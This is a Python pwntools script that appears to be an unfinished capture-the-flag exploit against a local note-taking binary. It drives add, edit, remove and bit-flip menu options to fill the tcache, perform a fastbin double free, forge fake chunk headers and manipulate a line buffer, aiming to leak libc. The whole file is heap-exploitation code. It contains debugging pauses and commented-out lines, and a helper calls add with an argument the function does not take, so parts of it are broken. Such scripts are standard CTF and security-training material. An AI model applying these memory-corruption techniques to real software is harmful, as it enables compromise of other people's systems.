import pwn

limit=0x2cbfff+1
p = pwn.process(['prlimit',f'--rss={limit}',f'--as={limit}','/vuln'])

#p = pwn.process('vuln')
sizes = []
read_idx = None
n = 0
dummies = {0xa0:[], 0x80:[]}

def getidx():
    i = 0
    while True:
        if i in sizes:
            i += 1
            continue
        sizes.append(i)
        return i

def add(note):
    global n
    n -= 1
    p.sendlineafter(b'>',(n-0x12) * b'a')
    p.sendlineafter(b'Note: ',note)
    return getidx()

def quit():
    p.sendlineafter(b'>',b'q')

def edit(idx,note, padding = False):
    global n
    n -=1
    p.sendlineafter(b'>',(n-0x12) * b'e')
    
    n-=1
    p.sendlineafter(b'Index: ',f'{idx}'.encode().rjust(n-0x12,b' '))


    if not padding:
        p.sendlineafter(b'Note: ',note)
        n = len(note) -1
    else:
        n-=1
        p.sendlineafter(b'Note: ', note + (n-0x12 - len(note))* b'p')

def remove(idx):
    global n 
    n -= 1

    p.sendlineafter(b'>',(n-0x12) * b'r')

    n -=1
    
    p.sendlineafter(b'Index: ',f'{idx}'.encode().rjust(n-0x12,b' '))

    if not idx in sizes:
        print("double free")
        return
    sizes.remove(idx)

def flipnote(idx,byte, bit):
    global n
    
    n -= 1
    p.sendlineafter(b'>',(n-0x12) * b'f')
    
    n -= 1
    p.sendlineafter(b'Index: ',f'{idx}'.encode().rjust(n-0x12,b' '))
    
    n -= 1
    offset = 8 * byte +bit
    p.sendlineafter(b'Offset: ',f'{offset}'.encode().rjust(n-0x12,b' '))




def realloc_lb_helper(i):
    global n
    n = i
    i -= 0x12 # i is the actual chunk size
    p.sendlineafter(b'>',i * b'i') # trigger Invalid Option to don't change anything else

def realloc_lb(i):
    realloc_lb_helper((i>>1)+0x9)
    realloc_lb_helper(i)



def dub_fast(a,b):
    if len(a) > 0x70 or b is not None and len(b) > 0x70:
        print("wrong size")
        exit()

    a1 = add(b'a')
    b1 = add(b'b')
    c1 = add(b'c')
    
    # fill tcache
    dummies = []
    for i in range(7):
        dummies.append(add(b''))

    for i in range(7):
        remove(dummies[i])

    dummies = []
    remove(a1)
    remove(b1)
    remove(a1)


    for i in range(7):
        tmp = add(b'')
        print(tmp)
        dummies.append(tmp)

    if b is not None:
        b = add(b)
    else: # dub malloced chunk into line_buf
        add(b'b1',0x70) # trigger realloc to get chunk of 0x80

    #dummies.append(add(b'b1')) # 0x60, to impede realloc again
    a = add(a)
    for d in dummies:
        remove(d)
    return (a,b)

def empty(size):
    arr = dummies[size]
    for i in range(7):
        tmp = add((size-0x10) * b'd')
        arr.append(tmp)

def fill(k,size):
    arr = dummies[size]
    for i in range(k):
        remove(arr[i])



def leak_libc():
    realloc_lb(0x90)
    realloc_lb(0x60)
    realloc_lb(0x30)
    realloc_lb(0x100)
    flip = add(b'flip')
    cons = add(0x1f0 *b'c')
    realloc_lb(0xc0)
    realloc_lb(0x80)
    
    # fast dup
    realloc_lb(0x100)
    tar = add(b'tar')
    empty(0x80)

    fill(7,0x80)

    remove(tar)
    remove(flip)
    remove(tar)

    empty(0x80)

    realloc_lb(0xa0)
    realloc_lb(0x50)
    # the next chunk of size 0x80 is the same as tar -> line_buf
    realloc_lb(0x80)

    dum1 = add(0x1f0 * b'c')
    dum2 = add(0x1f0 * b'c')
    dum3 = add(0x1f0 * b'c')
    dum4 = add(0x1f0 * b'c')
    dum5 = add(0x1f0 * b'c')
    dum6 = add(0x1f0 * b'c')

    flip = add(b"flip")
    tar = add(b"tar")

    remove(dum1)
    remove(dum2)
    remove(dum3)
    remove(dum4)
    remove(dum5)
    remove(dum6)


    # flip -> tar
    remove(tar)
    remove(flip)
    
    flipnote(flip,0,4)
    flip = add(b'flip')
    remove(cons)
    
    
    realloc_lb(0x80)
    
    global n
    size = n-0x20
    fake = add(0x8 * b'h'+pwn.p64(0x81) +size * b'h')

    fill(6,0x80)
    
    empty(0xa0) # allocates 0x100
    fill(7,0xa0)
    #pwn.p64(0x0000000000000101)
    input()
    realloc_lb(0x80)
    edit(fake, 0x8 * b'h' +pwn.p64(0x101),padding = True)
    
    
    # now take all available memory
    add((0x1e010 - 0x90)* b'x')
    #add((0x1e10 )* b'x')
    #add((0xf10 )* b'x')
    #add((0x790 )* b'x')
    add((0x200 )* b'x')
    add((0x100 - 0x50)* b'x')
    #add((0x100 - 0x50)* b'x')
    #add((0x100 - 0x50)* b'x')
    input()
    remove(tar)
    #add((0xa0 - 0x20)* b'x')
    #add((0xa0 - 0x50)* b'x')

    #realloc_lb_helper(0x100)
    n -= 1
    edit(fake,0x18* b'j')
    
    input()
    

    

    

def main():
    try:
        input()
        leak_libc()
        
        p.interactive()
    except EOFError:
        print(p.recvall())

if __name__ == "__main__":
    main()
